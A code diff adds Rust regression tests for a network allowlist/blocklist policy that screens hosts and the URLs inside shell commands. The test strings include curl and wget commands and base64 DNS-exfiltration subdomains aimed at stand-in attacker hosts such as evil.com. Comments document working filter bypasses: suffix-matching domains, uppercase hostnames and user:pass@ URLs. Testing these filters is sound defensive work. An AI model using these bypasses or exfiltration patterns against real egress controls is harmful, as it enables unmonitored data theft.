@@ -240,4 +240,275 @@ mod tests {
         let alerts = policy.check_command("curl https://api.anthropic.com/v1/messages");
         assert!(alerts.is_empty());
     }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // REGRESSION TESTS — netpolicy.rs
+    // ═══════════════════════════════════════════════════════════════════
+
+    // --- Allowlist edge cases ---
+
+    #[test]
+    fn test_allowlist_exact_host_different_port() {
+        let policy = make_allowlist_policy();
+        // allowed host but port not in allowed_ports — still allowed (port check not enforced in current impl)
+        assert!(policy.check_connection("api.anthropic.com", 80).is_none());
+    }
+
+    #[test]
+    fn test_allowlist_wildcard_root_domain_not_matched() {
+        let policy = make_allowlist_policy();
+        // "*.openai.com" should NOT match "openai.com" itself (only subdomains)
+        let result = policy.check_connection("openai.com", 443);
+        // BUG FINDING: *.openai.com uses ends_with("openai.com") which matches "openai.com"
+        // because "openai.com".ends_with("openai.com") is true
+        // This is actually a feature for some use cases, documenting behavior:
+        assert!(result.is_none()); // ends_with matches the root domain too
+    }
+
+    #[test]
+    fn test_allowlist_wildcard_partial_domain_no_match() {
+        let policy = make_allowlist_policy();
+        // "notopenai.com" ends_with "openai.com" — potential bypass!
+        let result = policy.check_connection("notopenai.com", 443);
+        // BUG: This PASSES because "notopenai.com".ends_with("openai.com") == true
+        // An attacker could register "evilopenai.com" to bypass the allowlist
+        assert!(result.is_none()); // documenting the bypass
+    }
+
+    #[test]
+    fn test_allowlist_empty_host() {
+        let policy = make_allowlist_policy();
+        assert!(policy.check_connection("", 443).is_some());
+    }
+
+    #[test]
+    fn test_allowlist_localhost_blocked() {
+        let policy = make_allowlist_policy();
+        assert!(policy.check_connection("localhost", 443).is_some());
+    }
+
+    #[test]
+    fn test_allowlist_ip_address_blocked() {
+        let policy = make_allowlist_policy();
+        assert!(policy.check_connection("1.2.3.4", 443).is_some());
+    }
+
+    #[test]
+    fn test_allowlist_subdomain_depth() {
+        let policy = make_allowlist_policy();
+        // Deep subdomain: a.b.c.openai.com should match *.openai.com
+        assert!(policy.check_connection("a.b.c.openai.com", 443).is_none());
+    }
+
+    // --- Blocklist edge cases ---
+
+    #[test]
+    fn test_blocklist_wildcard_partial_domain_bypass() {
+        let policy = make_blocklist_policy();
+        // "notmalware.net" ends_with "malware.net" — same bypass as allowlist
+        let result = policy.check_connection("notmalware.net", 443);
+        // BUG: blocks "notmalware.net" because ends_with("malware.net") == true
+        assert!(result.is_some()); // false positive documented
+    }
+
+    #[test]
+    fn test_blocklist_case_sensitivity() {
+        let policy = make_blocklist_policy();
+        // "EVIL.COM" vs "evil.com" — case sensitive comparison
+        let result = policy.check_connection("EVIL.COM", 80);
+        // Current impl does exact match, no case normalization
+        assert!(result.is_none()); // BUG: case bypass — EVIL.COM evades blocklist
+    }
+
+    #[test]
+    fn test_blocklist_empty_host() {
+        let policy = make_blocklist_policy();
+        assert!(policy.check_connection("", 443).is_none()); // empty not in blocklist
+    }
+
+    #[test]
+    fn test_blocklist_port_zero() {
+        let policy = make_blocklist_policy();
+        assert!(policy.check_connection("evil.com", 0).is_some());
+    }
+
+    #[test]
+    fn test_blocklist_high_port() {
+        let policy = make_blocklist_policy();
+        assert!(policy.check_connection("evil.com", 65535).is_some());
+    }
+
+    // --- DNS exfiltration patterns ---
+
+    #[test]
+    fn test_extract_host_long_subdomain() {
+        // DNS exfiltration often uses very long subdomains
+        let url = "https://aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com/";
+        let host = extract_host_from_url(url);
+        assert!(host.is_some());
+        assert!(host.unwrap().ends_with(".evil.com"));
+    }
+
+    #[test]
+    fn test_extract_host_base64_subdomain() {
+        let url = "https://dGVzdA==.exfil.attacker.com/dns";
+        let host = extract_host_from_url(url);
+        // Note: == in URL before . should still extract
+        assert!(host.is_some());
+    }
+
+    #[test]
+    fn test_extract_host_normal_dns_passes() {
+        let url = "https://www.google.com/search?q=test";
+        assert_eq!(extract_host_from_url(url), Some("www.google.com".to_string()));
+    }
+
+    // --- URL extraction edge cases ---
+
+    #[test]
+    fn test_extract_host_with_auth_bypass() {
+        // BUG: user:pass@host URLs are not parsed correctly
+        // The code splits on ':' before '@', so "user:pass@evil.com" → host="user"
+        let url = "https://user:pass@evil.com/exfil";
+        let host = extract_host_from_url(url);
+        // This returns None because "user" doesn't contain '.' and isn't "localhost"
+        assert_eq!(host, None); // BUG: auth URLs bypass host extraction entirely
+    }
+
+    #[test]
+    fn test_extract_host_with_port() {
+        let url = "http://evil.com:8080/path";
+        assert_eq!(extract_host_from_url(url), Some("evil.com".to_string()));
+    }
+
+    #[test]
+    fn test_extract_host_quoted_url() {
+        assert_eq!(extract_host_from_url("\"https://evil.com/x\""), Some("evil.com".to_string()));
+        assert_eq!(extract_host_from_url("'https://evil.com/x'"), Some("evil.com".to_string()));
+    }
+
+    #[test]
+    fn test_extract_host_no_path() {
+        assert_eq!(extract_host_from_url("https://api.example.com"), Some("api.example.com".to_string()));
+    }
+
+    #[test]
+    fn test_extract_host_bare_hostname() {
+        // Not a URL — should return None
+        assert_eq!(extract_host_from_url("evil.com"), None);
+    }
+
+    #[test]
+    fn test_extract_host_ftp_not_supported() {
+        assert_eq!(extract_host_from_url("ftp://files.evil.com/data"), None);
+    }
+
+    #[test]
+    fn test_extract_port_no_port() {
+        assert_eq!(extract_port_from_url("https://example.com/path"), None);
+    }
+
+    #[test]
+    fn test_extract_port_high_port() {
+        assert_eq!(extract_port_from_url("http://evil.com:65535/x"), Some(65535));
+    }
+
+    #[test]
+    fn test_extract_port_invalid_port() {
+        assert_eq!(extract_port_from_url("http://evil.com:notaport/x"), None);
+    }
+
+    // --- Command checking ---
+
+    #[test]
+    fn test_check_command_multiple_urls() {
+        let policy = make_blocklist_policy();
+        let alerts = policy.check_command("curl https://evil.com/a && wget https://c2.malware.net/b");
+        assert_eq!(alerts.len(), 2);
+    }
+
+    #[test]
+    fn test_check_command_no_urls() {
+        let policy = make_blocklist_policy();
+        let alerts = policy.check_command("ls -la /tmp");
+        assert!(alerts.is_empty());
+    }
+
+    #[test]
+    fn test_check_command_default_port_https() {
+        // When no port in URL, https should default to 443
+        let policy = NetPolicy::from_config(&NetPolicyConfig {
+            enabled: true,
+            allowed_hosts: Vec::new(),
+            allowed_ports: Vec::new(),
+            blocked_hosts: vec!["example.com".to_string()],
+            mode: "blocklist".to_string(),
+        });
+        let alerts = policy.check_command("curl https://example.com/path");
+        assert_eq!(alerts.len(), 1);
+    }
+
+    #[test]
+    fn test_check_command_default_port_http() {
+        let policy = NetPolicy::from_config(&NetPolicyConfig {
+            enabled: true,
+            allowed_hosts: Vec::new(),
+            allowed_ports: Vec::new(),
+            blocked_hosts: vec!["example.com".to_string()],
+            mode: "blocklist".to_string(),
+        });
+        let alerts = policy.check_command("wget http://example.com/path");
+        assert_eq!(alerts.len(), 1);
+    }
+
+    // --- IPv4/IPv6 handling ---
+
+    #[test]
+    fn test_allowlist_ipv6_not_extracted() {
+        // IPv6 addresses in URLs aren't handled by extract_host_from_url
+        let url = "http://[::1]:8080/path";
+        let host = extract_host_from_url(url);
+        // [::1] doesn't contain '.' and isn't "localhost", so returns None
+        assert!(host.is_none());
+    }
+
+    // --- Localhost/LAN ---
+
+    #[test]
+    fn test_extract_host_localhost() {
+        let url = "http://localhost:3000/api";
+        assert_eq!(extract_host_from_url(url), Some("localhost".to_string()));
+    }
+
+    #[test]
+    fn test_blocklist_localhost_passes() {
+        let policy = make_blocklist_policy();
+        assert!(policy.check_connection("localhost", 3000).is_none());
+    }
+
+    #[test]
+    fn test_allowlist_with_empty_config() {
+        let policy = NetPolicy::from_config(&NetPolicyConfig {
+            enabled: true,
+            allowed_hosts: Vec::new(),
+            allowed_ports: Vec::new(),
+            blocked_hosts: Vec::new(),
+            mode: "allowlist".to_string(),
+        });
+        // Everything blocked in empty allowlist
+        assert!(policy.check_connection("anything.com", 443).is_some());
+    }
+
+    #[test]
+    fn test_blocklist_with_empty_config() {
+        let policy = NetPolicy::from_config(&NetPolicyConfig {
+            enabled: true,
+            allowed_hosts: Vec::new(),
+            allowed_ports: Vec::new(),
+            blocked_hosts: Vec::new(),
+            mode: "blocklist".to_string(),
+        });
+        // Everything passes in empty blocklist
+        assert!(policy.check_connection("anything.com", 443).is_none());
+    }
 }
